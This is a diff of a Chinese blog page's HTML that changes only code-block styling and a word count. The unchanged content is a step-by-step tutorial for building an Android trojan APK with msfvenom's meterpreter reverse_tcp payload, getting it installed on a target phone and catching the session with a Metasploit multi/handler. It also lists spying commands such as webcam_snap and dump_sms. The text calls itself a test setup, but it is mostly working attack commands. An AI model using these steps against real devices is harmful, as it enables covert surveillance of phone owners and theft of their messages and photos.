@@ -496,17 +496,17 @@
 <li>1.VMware Workstation Pro 虚拟机 版本任意 建议14或15 版本</li>
 <li>2.kali linux 2020镜像  建议使用用迅雷下载<br>  <a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/kali-images/kali-2020.2/kali-linux-2020.2-live-amd64.iso">官网镜像</a></li>
 <li>一部测试用的并且和kali Linux在一个网段下的安卓手机或者用电脑中的模拟器也可以 但是有一些命令无法执行比如:拍照….<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2></li>
-<li>首先打开已经安装好的kali linux,启动终端，输入 ipconfig 查看 当前系统IP地址<pre class="line-numbers language-none"><code class="language-none">ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>然后执行 msfvenom -p android/meterpreter/reverse_tcp LHOST= 这里输入刚才查出来的IP地址 LPORT=这里输入端口号 R &gt; 木马软件的名字.apk<pre class="line-numbers language-none"><code class="language-none">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=8888 R &gt; text.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>首先打开已经安装好的kali linux,启动终端，输入 ipconfig 查看 当前系统IP地址<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>然后执行 msfvenom -p android/meterpreter/reverse_tcp LHOST= 这里输入刚才查出来的IP地址 LPORT=这里输入端口号 R &gt; 木马软件的名字.apk<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=8888 R &gt; text.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>想办法将做出来的软件安装到目标手机上，这里我就将软件直接安装到手机上</li>
-<li>启动渗透测试框架<pre class="line-numbers language-none"><code class="language-none">msfconsole <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>使用渗透测试框架中的模块<pre class="line-numbers language-none"><code class="language-none">use multi/handler
+<li>启动渗透测试框架<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>使用渗透测试框架中的模块<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use multi/handler
 set payload android/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li>此时输入 show options 可以获得要输入的参数<pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li>然后直接设定即可<pre class="line-numbers language-none"><code class="language-none">set LPORT 8888
+<li>此时输入 show options 可以获得要输入的参数<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>然后直接设定即可<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set LPORT 8888
 set LHOST 192.168.1.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li>执行 run 命令之后会获得一个会话等待连接 <pre class="line-numbers language-none"><code class="language-none">run <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-此时输入 ？ 可以得到可以执行的命令例如<pre class="line-numbers language-none"><code class="language-none">sysinfo # 系统信息
+<li>执行 run 命令之后会获得一个会话等待连接 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">run <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+此时输入 ？ 可以得到可以执行的命令例如<pre class="line-numbers language-text" data-language="text"><code class="language-text">sysinfo # 系统信息
 app_list # 安装的软件列表
 webcam_snap # 打开摄像头并拍照
 dump_sms  # 获取短信内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
@@ -1062,7 +1062,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">8.5k</span>&nbsp;字
+                class="white-color">9k</span>&nbsp;字
             
             
             
